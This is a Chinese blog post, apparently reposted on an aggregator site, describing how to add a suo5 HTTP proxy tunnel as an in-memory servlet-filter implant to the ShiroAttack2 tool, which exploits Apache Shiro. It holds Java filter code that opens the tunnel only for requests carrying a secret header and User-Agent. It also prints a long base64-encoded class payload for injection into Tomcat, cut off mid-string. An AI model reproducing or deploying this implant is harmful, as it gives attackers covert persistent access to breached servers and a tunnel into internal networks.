---
title: ShiroAttack2：内存马-SUO5正向代理
url: https://buaq.net/go-156567.html
source: unSafe.sh - 不安全
date: 2023-04-03
fetch_date: 2025-10-04T11:29:43.523486
---

# ShiroAttack2：内存马-SUO5正向代理

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/c2193dfd46286f1fca754fed972a05e3.jpg)

ShiroAttack2：内存马-SUO5正向代理

0x01 工具参考https://github.com/zema1/suo5 - 一款高性能 HTTP 代理隧道工具0x02 代码实现01 获取代码suo
*2023-4-2 18:53:6
Author: [1oecho.github.io(查看原文)](/jump-156567.htm)
阅读量:187
收藏*

---

## 0x01 工具参考

https://github.com/zema1/suo5 - 一款高性能 HTTP 代理隧道工具

![image-20230402185208575](https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852613.png)

## 0x02 代码实现

### 01 获取代码

suo5 工具大佬提供了Filter的代码，直接拿来使用即可，

* https://github.com/zema1/suo5/tree/main/assets

![image-20230402190540195](https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021905213.png)

### 02 修改ShiroAttack2

分析了下Shiro\_Attack注入内存马的过程，直接开始修改，过程如下：

* 第一步，直接在`src/main/java/com/summersec/x`找一个原有的Filter复制修改下类名，为了好区分起名`SUO5Filter`，补充所有方法和定义的变量，修改`Suo5Filter#doFilter`，补充调用到的函数和方法，以及变量即可。因为实际注入只需要接受path参数，pwd那些其他的删掉就行：

```
public void doFilter(ServletRequest sReq, ServletResponse sResp, FilterChain chain) throws IOException, ServletException {

        HttpServletRequest request = (HttpServletRequest) sReq;
        HttpServletResponse response = (HttpServletResponse) sResp;

        // 自己增加一个建立链接的判断
        if (request.getHeader("Proxy").equals("UP")){
        String agent = request.getHeader("User-Agent");
        String contentType = request.getHeader("Content-Type");

        // 建立代理的代码实际修改就可以，我就直接拿来使用了，注意服务端和客户端要对应
        if (agent == null || !agent.equals("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3")) {
            if (chain != null) {
                chain.doFilter(sReq, sResp);
            }
            return;
        }
        if (contentType == null) {
            return;
        }

        try {
            if (contentType.equals("application/plain")) {
                tryFullDuplex(request, response);
                return;
            }

            if (contentType.equals("application/octet-stream")) {
                processDataBio(request, response);
            } else {
                processDataUnary(request, response);
            }
        } catch (Throwable e) {
        }
        } else {
            response.setStatus(404);
            response.setHeader("Vary","No");
        }

        chain.doFilter(sReq, sResp);
    }
```

* 第二步，通过自带的 `com/summersec/attack/deser/plugins/servlet/MemBytes.java`来生成我们修改好的Class，后续加载进去，增加一个新的值即可，Key是自己定义的名字后续调用时使用，Value是我们新增的Class的类名：

![img](https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852127.png)

* 第三步，生成SuoFilter的Base64编码的字节码，有自带的方法直接用就行：

![img](https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852569.png)
![img](https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852405.png)

生成结果如下：

```
MEM_TOOLS.put("Suo5Filter", "yv66vgAAADQEHgoBGgJLCQDtAkwJAO0CTQgCTgkA7QJPCAJQCQDtAlEIAlIJAO0CUwkA7QJUCQDtAlUIAlYKACoCVwoAKgJYCAJZCgDtAloKAO0CWwgCXAoCXQJeCAJfCgAqAmAIAmEKAB4CYgcCYwoAGAJLCAJkCgAYAmUIAmYKABgCZwcCaAoAHgJpBwJqCgJrAmwKACACbQoAKgJuBwE7CAJvCgAeAnAIAnEKACoCcggCcwcCdAgCdQoAKgJ2CAJ3CAJ4CgAqAnkKARoCegoBGgJ7CAJ8CgJ9An4KACoCfwoCfQKABwKBCgJ9AoIKADYCgwoANgKECgAqAoUHAoYKAO0ChwgCiAsAVwKJCgDtAooIAosKACoCjAcCjQoAQgKOBwKPCgBEAksIApAIApEIApILAFgCkwsAVwKUCwBYApQKAO0ClQoARAKWCAKXCgA7AmcLAFgCmAoARAJnCgKZApoKApkCmwoCmQKcCgAeAp0HAW0HAp4HAp8IAqAIAqEKAB4CoggCowgBHAoAHgKkCgKlAqYKAqUCpwgBHgsAVwKoCgJdAqkKACoCqgsCqwKsCAKtBwKuBwKvBwKwCAKxCQKyArMKAqUCtAsCqwK1CQK2ArcKArgCuQsBiwK6CAK7CgJrAqYJArICvAgCvQgCvggBfAgCvwoAKgLACgJdAsEIAsIKADsCwwgCxAgCxQgCxggCxwgCyAgCyQsCygLLCALMCgDtAs0IAs4KAO0CzwoA7QLQBwLRCwBYAtIIAtMIAtQLAFgC1QcC1goAjQJLCgCNAtcKAtgC2QoC2ALaBQAAAAAAAADICgDvAtsLAFcC3AcC3QoAlgLeCgCWAt8HAuAKAJkC4QoAmQLiCgCZAuMKAJkC5AoAmQLlBwLmCgAeAucHAugKAJ8C6QgC6goC6wLsBwLtCgLrAu4KAusC7woAnwLwCwBXAvELAvIC8wsC8gL0CgCZAvUKAJkC9goA7QL3CgEAAvgKAQACmwoBAAKcCgCZAvkLAFcC%2BgoA7QL7CwBYAvwHAv0KALYCSwgC%2FgoAtgL%2FCAFbCAMABwMBCgC8AksKALYDAgsDAwMECwMFAwYLAwUDBwoAtgKnCgC8AwgKALwC%2BAoA7QMJCgC8AwoKAwsDDAoDCwMNCgMLAw4KAwsDDwoDCwMQBwMRCgDMAxIKAMwDEwoDCwMUCgMLAxUKAwsDFgMCAAAABwMXCAMYCgDTAt4IAxkKADsC3goDGgMbCAMcCgDtAx0IAx4HAx8KANwDEgoA7QMgCwBYAyEIAyIIAyMIAyQIAf8KAyUDJgcDJwoA5QJLBwMoCgDnAykKAOUDKgoA7QMrCgDlAvYKAOUDLAcDLQoA7QMuBwMvBwMwCgDvAzEKAO8DMgoA7QMzCgDlApwKAO8DNAoC2AM1CgDtAzYLAFcDNwsDOAKoCAM5CgC2AzoKAO0DOwoA7QM8CgCZAz0LAqsDPgcDPwoA7QNACgCZAywLAqsDQQsCqwNCCgDtA0MKAQcDRAcDRQoBBwNGBwNHCgEJA0gKACoDSQoDSgNLCgCWA0wJAO0DTQoAtgNOBwNPCANQBwNRCANSCANTCANUCANVCANWCANXCgDtA1gHA1kHA1oBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQACY3MBABJMamF2YS9sYW5nL1N0cmluZzsBAARwYXRoAQAFdG9rZW4BAAVhZGRycwEAE0xqYXZhL3V0aWwvSGFzaE1hcDsBAAlTaWduYXR1cmUBADpMamF2YS91dGlsL0hhc2hNYXA8TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9Cb29sZWFuOz47AQAJZ0luU3RyZWFtAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAKZ091dFN0cmVhbQEAFkxqYXZhL2lvL091dHB1dFN0cmVhbTsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHExjb20vc3VtbWVyc2VjL3gvU3VvNUZpbHRlcjsBAC4oTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvaW8vT3V0cHV0U3RyZWFtOylWAQACaW4BAANvdXQBAAx4b3JCNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQADc3JjAQADa2V5AQAGcmVzdWx0AQACW0IBAApFeGNlcHRpb25zAQAGYmFzZTY0AQAYKFtCTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAGQmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAVjb2RlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAA2I2NAEABG1vZGUBAApjbGFzc2J5dGVzAQANU3RhY2tNYXBUYWJsZQcCaAcCagEAA3hvcgEACChbQltCKVtCAQABaQEAAUkBAARkYXRhAQACbWwBAAJrbAEAA3B3ZAEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAANtZDUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAAW0BAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAAXMBAANyZXQHAnQHAoYBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAEdmFyNwEAA29iagEABm91dHB1dAEAGExqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEABXRhZ19zAQAFdGFnX2UHAy0HAo8BAAhwYXJzZU9iagEAFShMamF2YS9sYW5nL09iamVjdDspVgEAE1tMamF2YS9sYW5nL09iamVjdDsBAAVjbGF6egEAA3JlcQEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAhyZXF1ZXN0MgEABHJlc3ABAAR2YXI4AQAJYWRkRmlsdGVyAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAlmaWx0ZXJNYXABAAV2YXIyNAEADGZpbHRlck1hcE9iagEABG5hbWUBABFmaWx0ZXJTdGFydE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZmluZEZpbHRlck1hcHMBAApmaWx0ZXJNYXBzAQANdG1wRmlsdGVyTWFwcwEABWluZGV4AQAFdmFyMjcBAAV2YXIyOAEABXZhcjExAQAFdmFyMjUBAAxjb250ZXh0RmllbGQBABJhcHBsaWNhdGlvbkNvbnRleHQBAC1Mb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL0FwcGxpY2F0aW9uQ29udGV4dDsBAA9zdGFuZGFyZENvbnRleHQBACpMb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dDsBAApzdGF0ZUZpZWxkAQASZmlsdGVyUmVnaXN0cmF0aW9uBwNcAQAHRHluYW1pYwEADElubmVyQ2xhc3NlcwEAKkxqYXZheC9zZXJ2bGV0L0ZpbHRlclJlZ2lzdHJhdGlvbiREeW5hbWljOwEADnNlcnZsZXRDb250ZXh0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldENvbnRleHQ7AQAGZmlsdGVyAQAWTGphdmF4L3NlcnZsZXQvRmlsdGVyOwEACmZpbHRlck5hbWUBAAN1cmwHA10HA1oHA14HAq4HAq8HA1wHA18HAtEBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsHA2ABAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAVhZ2VudAEAC2NvbnRlbnRUeXBlAQAEc1JlcQEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEABXNSZXNwAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEABWNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwNhBwNiBwNjBwKeBwKfAQAHZGVzdHJveQEAGnJlYWRJbnB1dFN0cmVhbVdpdGhUaW1lb3V0AQAbKExqYXZhL2lvL0lucHV0U3RyZWFtO1tCSSlWAQAKcmVhZExlbmd0aAEACnJlYWRSZXN1bHQBAAJpcwEADXRpbWVvdXRNaWxsaXMBAAxidWZmZXJPZmZzZXQBAA1tYXhUaW1lTWlsbGlzAQABSgcDZAEACHJlZGlyZWN0AQBqKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZhL3V0aWwvSGFzaE1hcDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbmV0L0h0dHBVUkxDb25uZWN0aW9uOwEAA2N0eAEAGkxqYXZheC9uZXQvc3NsL1NTTENvbnRleHQ7A...